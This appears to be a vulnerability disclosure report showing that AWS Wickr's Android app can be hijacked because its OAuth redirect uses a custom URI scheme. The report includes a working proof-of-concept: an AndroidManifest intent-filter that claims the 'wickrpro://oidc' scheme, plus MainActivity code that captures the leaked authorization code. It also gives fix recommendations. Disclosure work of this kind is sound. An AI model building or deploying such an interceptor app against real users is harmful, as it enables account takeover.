# Title: Account Takeover Due to Incorrect Implementation of Android App Links in AWS Wickr (com.wickr.pro)
---


# What i was able to do:
I was able to steal to the code of a user (myself), With this code, I gained full access to the user’s account, performing a complete Account Takeover.  

---


## POC:


---


# Description:
The core issue lies in the assumption made during the authentication flow, where ownership of the custom scheme specified in the `redirect_uri` is presumed to be exclusively tied to the legitimate client application. 

## Redirection Flow:

**Inital** --> https://wickr-guest-access-pro-prod.auth.us-east-1.amazoncognito.com/login?redirect_uri=https://messaging-pro-prod.wickr.com/deeplink/oidc.php&client_id=5kgp122go99k6mfdqtnvqfmsts&response_type=code&state=IUDsNsCe_8y4bVrh6GiODg&nonce=x4JOMpgDcyGbmCS2KpGc_g&scope=email%20profile%20openid&code_challenge=PYthl9xQJphzK8tfeqY4HXFbUrugbpqpZ-AnNLE91D8&code_challenge_method=S256

**Which Redirects to** --> https://messaging-pro-prod.wickr.com/deeplink/oidc.php

**Final Redirection to App** ---> wickrpro://oidc?step=3


Now Here, when `wickrpro://oidc` is used, it is assumed that `wickrpro://oidc` only belongs to the AWS Wickr app, since the app configured this to this custom scheme as part of the authentication process.

However, The problem with this approach is that any application on the user's device can potentially register this custom scheme, thereby receiving the authentication code that was intended for the AWS wickr app.

This allows two applications to potentially register the same custom URI scheme. If both apps use identical attributes (e.g., scheme, host, port, or path), the system will prompt the user to choose which app should handle the authentication response. This opens the door for attackers to craft a malicious APK that masquerades as the legitimate app, intercepting the authentication code and redirecting it to their exploitative app instead.

---


# Steps to reproduce:

To exploit this in AWS Wickr app you need to create an exploit apk, follow the below steps:

1. Create  an Android Studio Project
1. Create an empty Activity
1. Go to *AndroidManifest.xml* file and add an intent filter as shown below inside your main activity, so that the system automatically routes those URL intents to your app (exploit app).

```
            <intent-filter>
                <action
                    android:name="android.intent.action.VIEW" />
                <category
                    android:name="android.intent.category.DEFAULT" />
                <category
                    android:name="android.intent.category.BROWSABLE" />
                <data
                    android:scheme="wickrpro"
                    android:host="oidc" />
            </intent-filter>

```

1. Add the following code to MainActivity.java and build the APK.

```
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

/* loaded from: classes.dex */
public class MainActivity extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        Uri data;
        super.onCreate(bundle);
        setContentView(R.layout.activity_main);
        TextView textView = (TextView) findViewById(R.id.titleTextView);
        TextView textView2 = (TextView) findViewById(R.id.textView);
        Button button = (Button) findViewById(R.id.copyButton);
        button.setVisibility(8);
        Intent intent = getIntent();
        if (!"android.intent.action.VIEW".equals(intent.getAction()) || (data = intent.getData()) == null) {
            return;
        }
        final String uri = data.toString();
        textView.setText("OAuth Code Leaked Successfully");
        textView2.setText(uri);
        button.setVisibility(0);
        button.setOnClickListener(new View.OnClickListener() { // from class: com.oauth.exploitfb1.MainActivity.1
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                ((ClipboardManager) MainActivity.this.getSystemService("clipboard")).setPrimaryClip(ClipData.newPlainText("URL", uri));
                Toast.makeText(MainActivity.this, "Data copied to clipboard", 0).show();
            }
        });
        Toast.makeText(this, "Data received", 0).show();
    }
}
```

---


# Recommendation:

- App to app integration like Google Identity Services and Facebook Express Login for Android.

- Android's verifiable AppLinks - https://developer.android.com/training/app-links/verify-android-applinks)

---


# Reference:
- [https://developers.googleblog.com/2023/10/enhancing-oauth-app-impersonation-protections.html](https://developers.googleblog.com/2023/10/enhancing-oauth-app-impersonation-protections.html)

- [https://developer.android.com/training/app-links/verify-android-applinks](https://developer.android.com/training/app-links/verify-android-applinks)

- [https://blog.ostorlab.co/one-scheme-to-rule-them-all.html](https://blog.ostorlab.co/one-scheme-to-rule-them-all.html)  
